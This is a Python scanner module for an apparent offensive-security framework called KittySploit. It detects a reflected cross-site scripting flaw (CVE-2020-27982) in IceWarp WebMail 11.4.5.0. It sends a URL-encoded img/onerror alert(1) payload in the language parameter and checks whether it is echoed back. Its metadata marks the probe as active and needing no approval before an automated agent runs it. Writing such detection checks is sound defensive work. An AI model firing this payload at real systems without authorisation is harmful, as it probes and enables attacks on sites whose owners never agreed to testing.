#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IceWarp WebMail 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IceWarp WebMail 11.4.5.0 - Cross-Site Scripting Detection',
        'description': 'IceWarp WebMail 11.4.5.0 is vulnerable to cross-site scripting via the language parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'icewarp', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/159763/Icewarp-WebMail-11.4.5.0-Cross-Site-Scripting.html',
            'https://cxsecurity.com/issue/WLB-2020100161',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-27982',
            'http://packetstormsecurity.com/files/159763/Icewarp-WebMail-11.4.5.0-Cross-Site-Scripting.html',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2020-27982',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<img src=x onerror=alert(1)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="IceWarp WebMail 11.4.5.0 - Cross-Site Scripting detected",
                path='/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
            )
            return True
        return False

